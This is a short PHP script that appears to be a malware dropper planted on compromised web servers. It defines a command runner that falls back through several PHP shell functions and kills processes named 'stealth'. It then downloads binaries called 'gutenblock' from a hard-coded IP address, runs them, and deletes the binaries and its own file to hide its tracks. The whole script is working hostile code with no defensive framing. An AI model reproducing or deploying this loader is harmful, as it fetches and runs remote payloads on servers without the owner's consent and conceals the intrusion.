<?php
function get($durl, $filename) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $durl);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch,CURLOPT_TIMEOUT,20);
	$data = curl_exec($ch);
	if(!$data){
		$data = @file_get_contents($durl);
	}
	file_put_contents('./'.$filename, $data);
}
function comd($command){
	$result = '';
	if(function_exists('system')){
		ob_start();
		@system($command);
		$result = ob_get_clean();
	}elseif(function_exists('exec')){
		@exec($command,$result);
		$result = @join("\n",$result);
	}elseif (function_exists('passthru')){
		ob_start();
		@passthru($command);
		$result = ob_get_clean();
	}elseif(function_exists('shell_exec')){
		$result = shell_exec($command);
	}elseif(is_resource($f = @popen($command,"r"))){
		$result = "";
		while(!@feof($f))
			$result .= fread($f,1024);
		pclose($f);
	}
	$type = mb_detect_encoding($result, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5','LATIN1'));
	if($type != 'UTF-8'){
		$result = mb_convert_encoding($result, 'UTF-8', $type);
	}
	return $result;
}
comd("pkill -9 -f stealth");
comd("pkill -f -9 stealth");
get("http://198.100.145.141/gutenblock-64","gutenblock-64");
$result = comd("chmod +x gutenblock-64 && ./gutenblock-64");
if(strstr($result,"3.04")){
	echo $result;
}else{
	get("http://198.100.145.141/gutenblock-86","gutenblock-86");
	$result2 = comd("chmod +x gutenblock-86 && ./gutenblock-86");
	echo $result2;
}
unlink("./gutenblock-64");
unlink("./gutenblock-86");
unlink("./file_get.php");
